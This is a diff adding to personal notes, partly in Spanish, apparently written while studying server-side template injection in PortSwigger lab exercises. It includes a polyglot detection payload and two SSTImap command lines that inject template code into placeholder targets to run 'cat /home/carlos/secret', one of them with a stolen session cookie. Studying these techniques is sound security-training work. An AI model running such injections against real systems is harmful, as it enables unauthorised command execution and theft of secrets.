@@ -12,6 +12,28 @@ In most cases, this polyglot payload will trigger an error in presence of a SSTI
 ```powershell
 ${{<%[%'"}}%\.
 ```
+### SSTI Identified
+
+> SSTI can be _**identified**_ using the tool [SSTImap](https://github.com/vladko312/SSTImap). The limitations of this tool is that the template expression `{{7*7}}` results are sometimes only evaluated by another GET request or calling another function in the application, as the **output** is not directly reflected or echoed into the response where the template expression was posted.  
+> Alternative way to _**identify**_ the template framework is to induce error message by injecting malformed user supplied payloads.
+
+Esta tool, la tengo en mi directorio principal /Users/juanfelipeoz/ y la puedo activar el entorno virtual con `source venv/bin/activate;`
+
+Dejo la url igualmente pa ver los commands de ejemplo: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
+
+[Tib3rius give great SSTI explanation on this PortSwigger Web Academy labs tutorial](https://youtu.be/p6ElHfcnlSw)
+
+```shell
+python3 sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd "cat /home/carlos/secret"
+```
+
+> POST request with the data param to test and send payload using SSTImap tool.
+
+```shell
+python3 sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken&template=fuzzer&template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'
+```
+
+![[Pasted image 20260810210927.png]]
 
 ---
 
